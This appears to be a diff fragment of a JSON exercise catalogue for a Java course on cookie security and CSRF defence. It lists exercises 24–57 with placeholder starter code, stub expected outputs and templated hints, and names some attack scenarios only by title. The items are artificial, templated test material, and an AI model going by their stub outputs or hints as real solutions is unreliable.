+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Full Cookie Security String ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Full Cookie Security String ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Full Cookie Security String: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Cookie Audit Checker",
+          "description": "Analyze cookies and report missing security flags.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Cookie Audit Checker ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Cookie Audit Checker ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Cookie Audit Checker: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: SameSite Browser Compatibility",
+          "description": "Handle old browsers that ignore SameSite.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== SameSite Browser Compatibility ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== SameSite Browser Compatibility ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For SameSite Browser Compatibility: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Session Cookie vs CSRF Cookie",
+          "description": "Explain why session needs HttpOnly but CSRF cookie does not.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Session Cookie vs CSRF Cookie ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Session Cookie vs CSRF Cookie ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Session Cookie vs CSRF Cookie: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Cookie Scope and Domain",
+          "description": "Configure cookie domain and path correctly.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Cookie Scope and Domain ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Cookie Scope and Domain ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Cookie Scope and Domain: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Secure Cookie Factory",
+          "description": "Build a factory class that creates secure cookies.",
+          "difficulty": "advanced",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Secure Cookie Factory ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Secure Cookie Factory ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Secure Cookie Factory: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Cookie Security Report Generator",
+          "description": "Audit all cookies and generate security report.",
+          "difficulty": "advanced",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Cookie Security Report Generator ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Cookie Security Report Generator ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Cookie Security Report Generator: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Build a CSRF Proof of Concept",
+          "description": "Create a harmless CSRF test page.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Build a CSRF Proof of Concept ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== Build a CSRF Proof of Concept ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For Build a CSRF Proof of Concept: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: CSRF via Image Tag",
+          "description": "Demonstrate GET-based CSRF attack.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF via Image Tag ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF via Image Tag ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF via Image Tag: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: CSRF via Hidden Form",
+          "description": "Build a hidden POST form attack.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF via Hidden Form ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF via Hidden Form ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF via Hidden Form: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: CSRF via JavaScript",
+          "description": "Use XMLHttpRequest for CSRF.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF via JavaScript ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF via JavaScript ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF via JavaScript: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Login CSRF Attack",
+          "description": "Demonstrate logging victim into attacker's account.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Login CSRF Attack ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== Login CSRF Attack ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For Login CSRF Attack: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: CSRF on Password Change",
+          "description": "Show how password change is vulnerable.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF on Password Change ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF on Password Change ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF on Password Change: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: CSRF Chain Attack",
+          "description": "Change email then reset password.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Chain Attack ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF Chain Attack ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF Chain Attack: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Router CSRF Attack",
+          "description": "Demonstrate CSRF against home router.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Router CSRF Attack ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== Router CSRF Attack ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For Router CSRF Attack: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: CSRF vs CORS",
+          "description": "Explain why CORS does not prevent CSRF.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF vs CORS ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF vs CORS ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF vs CORS: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: CSRF in Single Page Apps",
+          "description": "Analyze CSRF risks in modern SPA architecture.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 6,
+          "ai_intro": "Understanding attacks makes you a better defender!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF in Single Page Apps ===\");\n        // TODO: Analyze or demonstrate this CSRF scenario\n        // Think about: What makes it possible? How to prevent it?\n    }\n}",
+          "expected_output": "=== CSRF in Single Page Apps ===\n(Scenario analysis output)",
+          "hints": [
+            {
+              "message": "Think about the 4 CSRF steps: Login, Bait, Trigger, Execution."
+            },
+            {
+              "message": "For CSRF in Single Page Apps: what specific vulnerability enables this attack?"
+            },
+            {
+              "message": "Map the attack to the defence: tokens, SameSite, Origin checks, or re-authentication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Write a CSRF Validation Method",
+          "description": "Complete token validation with all edge cases.",
+          "difficulty": "intermediate",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Write a CSRF Validation Method ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Write a CSRF Validation Method ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Write a CSRF Validation Method: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Add Origin Header Check",
+          "description": "Validate the Origin header on POST requests.",
+          "difficulty": "intermediate",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Add Origin Header Check ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Add Origin Header Check ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Add Origin Header Check: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Build Double Submit Cookie",
+          "description": "Implement stateless CSRF protection.",
+          "difficulty": "intermediate",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Build Double Submit Cookie ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Build Double Submit Cookie ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Build Double Submit Cookie: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: CSRF Protection for AJAX",
+          "description": "Protect fetch/XMLHttpRequest endpoints.",
+          "difficulty": "advanced",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Protection for AJAX ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== CSRF Protection for AJAX ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For CSRF Protection for AJAX: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Complete CSRF Servlet Filter",
+          "description": "Build a reusable filter for all servlets.",
+          "difficulty": "advanced",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Complete CSRF Servlet Filter ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Complete CSRF Servlet Filter ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Complete CSRF Servlet Filter: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: CSRF Error Response Handler",
+          "description": "Return appropriate errors for CSRF failures.",
+          "difficulty": "intermediate",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Error Response Handler ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== CSRF Error Response Handler ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For CSRF Error Response Handler: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Protect Multiple Forms on One Page",
+          "description": "Handle token per-form vs per-page.",
+          "difficulty": "advanced",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Protect Multiple Forms on One Page ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Protect Multiple Forms on One Page ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Protect Multiple Forms on One Page: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: CSRF Logging and Monitoring",
+          "description": "Log CSRF attack attempts for analysis.",
+          "difficulty": "intermediate",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Logging and Monitoring ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== CSRF Logging and Monitoring ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For CSRF Logging and Monitoring: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Rate Limit CSRF Failures",
+          "description": "Block IPs with repeated CSRF failures.",
+          "difficulty": "advanced",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Rate Limit CSRF Failures ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Rate Limit CSRF Failures ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Rate Limit CSRF Failures: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Spring Security CSRF Config",
+          "description": "Configure CSRF in Spring Security framework.",
+          "difficulty": "advanced",
+          "category": "Defence Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building real-world CSRF defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Spring Security CSRF Config ===\");\n        // TODO: Implement this defence mechanism\n        // Follow the 3 hints for step-by-step guidance\n    }\n}",
+          "expected_output": "=== Spring Security CSRF Config ===\n(Defence implementation output)",
+          "hints": [
+            {
+              "message": "Start with the simplest version that works."
+            },
+            {
+              "message": "For Spring Security CSRF Config: handle the edge cases (null values, expired tokens, missing headers)."
+            },
+            {
+              "message": "Review the Complete CSRF Filter example in the Slides tab for the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Bank Transfer Protection System",
+          "description": "Build complete CSRF defence for a banking app.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Bank Transfer Protection System ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== Bank Transfer Protection System ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For Bank Transfer Protection System: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Social Media Post Protection",
+          "description": "Prevent CSRF on posting/sharing actions.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Social Media Post Protection ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== Social Media Post Protection ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For Social Media Post Protection: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: E-commerce Checkout Defence",
+          "description": "Protect shopping cart and payment.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== E-commerce Checkout Defence ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== E-commerce Checkout Defence ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For E-commerce Checkout Defence: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: Admin Panel CSRF Hardening",
+          "description": "Extra protection for admin functionality.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Admin Panel CSRF Hardening ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== Admin Panel CSRF Hardening ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For Admin Panel CSRF Hardening: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: API Gateway CSRF Filter",
+          "description": "CSRF protection for microservices API gateway.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== API Gateway CSRF Filter ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== API Gateway CSRF Filter ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For API Gateway CSRF Filter: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: CSRF Penetration Test Report",
+          "description": "Write a professional vulnerability report.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Penetration Test Report ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== CSRF Penetration Test Report ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For CSRF Penetration Test Report: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Full-Stack CSRF Implementation",
+          "description": "Server + client-side protection combined.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Full-Stack CSRF Implementation ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== Full-Stack CSRF Implementation ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For Full-Stack CSRF Implementation: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
